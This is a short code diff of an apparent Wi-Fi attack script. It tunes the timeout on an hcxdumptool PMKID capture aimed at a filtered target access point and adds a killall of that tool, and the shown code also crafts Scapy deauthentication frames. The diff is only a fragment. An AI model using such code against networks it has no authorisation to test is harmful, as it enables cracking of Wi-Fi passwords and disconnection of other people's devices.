@@ -29,7 +29,7 @@ DROPBOX_KEY_PATH = 'DropboxKey.txt'
 HS_TIMEOUT_AFTER_DEAUTH = 5 # In seconds
 DEFAULT_NETWORK_INTERFACE = "wlan0"
 ENABLE_DROPBOX_UPLOAD = False
-
+pmkid_timeout = 10 # In seconds
 packet_list = []
 
 
@@ -150,11 +150,11 @@ def try_pmkid(iface, pcap_file, channel, ap):
     mac = os.path.abspath(os.getcwd() + '/ap_filter.mac')
     print(mac)
     try:
-        subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}", shell=True, timeout=20)
+        subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}", shell=True, timeout=pmkid_timeout)
 
     except subprocess.TimeoutExpired:
         _find_pmkids(pmkid_file)
-
+        subprocess.call('killall hcxdumptool', shell=True)
 
 def send_deauth_packet():
     pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
